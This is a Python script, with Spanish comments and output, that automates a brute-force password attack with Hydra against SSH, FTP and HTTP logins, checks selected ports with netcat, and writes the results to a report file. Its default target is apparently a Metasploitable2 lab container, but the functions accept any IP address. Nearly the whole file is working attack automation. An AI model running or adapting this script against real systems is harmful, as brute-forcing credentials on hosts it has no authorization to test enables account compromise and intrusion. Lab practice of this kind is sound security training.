import subprocess

def run_hydra(target_ip, service, userlist, passlist):
    print(f"[*] Iniciando escaneo Hydra para {service} en {target_ip}...")
    cmd = ["hydra", "-L", userlist, "-P", passlist, f"{service}://{target_ip}"]
    try:
        result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        if result.returncode == 0:
            print("[+] Resultados de Hydra:")
            print(result.stdout)
            return result.stdout
        else:
            print("[-] Error al ejecutar Hydra.")
            print(result.stderr)
            return result.stderr
    except Exception as e:
        print(f"[-] Error al ejecutar Hydra: {e}")
        return str(e)

def run_nc_scan(target_ip, ports):
    results = {}
    for port in ports:
        print(f"[*] Ejecutando nc en {target_ip}:{port}...")
        cmd = ["nc", "-zv", target_ip, str(port)]
        try:
            result = subprocess.run(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            if "succeeded" in result.stderr:
                print(f"[+] Puerto {port} abierto en {target_ip}.")
                results[port] = f"[+] Puerto {port} abierto en {target_ip}."
            else:
                print(f"[-] Puerto {port} cerrado o inaccesible.")
                results[port] = f"[-] Puerto {port} cerrado o inaccesible."
        except Exception as e:
            print(f"[-] Error al ejecutar nc: {e}")
            results[port] = str(e)
    return results

def generate_report(target_ip, hydra_results, nc_results):
    report_filename = "scan_report.txt"
    with open(report_filename, "w") as report_file:
        report_file.write(f"Informe de Escaneo para {target_ip}\n")
        report_file.write("=" * 40 + "\n")
        report_file.write("Resultados de Hydra:\n")
        report_file.write("-" * 40 + "\n")
        for service, result in hydra_results.items():
            report_file.write(f"Servicio: {service}\n")
            report_file.write(result + "\n")
            report_file.write("-" * 40 + "\n")
        report_file.write("Resultados de Netcat:\n")
        report_file.write("-" * 40 + "\n")
        for port, result in nc_results.items():
            report_file.write(f"Puerto: {port}\n")
            report_file.write(result + "\n")
            report_file.write("-" * 40 + "\n")
    print(f"[+] Informe generado: {report_filename}")

if __name__ == "__main__":
    target_ip = "172.17.0.2"  # IP del contenedor metasploitable2
    userlist = "users.txt"  # Ruta al archivo de usuarios
    passlist = "passwords.txt"  # Ruta al archivo de contraseñas

    # Puertos adicionales para escanear
    additional_ports = [443, 3306, 8080]

    hydra_results = {}
    nc_results = {}

    # Escaneo de protocolos SSH, FTP y HTTP con Hydra
    for service in ["ssh", "ftp", "http-get"]:
        result = run_hydra(target_ip, service, userlist, passlist)
        hydra_results[service] = result

    # Escaneo de puertos adicionales con nc
    nc_results = run_nc_scan(target_ip, additional_ports)

    # Generar informe
    generate_report(target_ip, hydra_results, nc_results)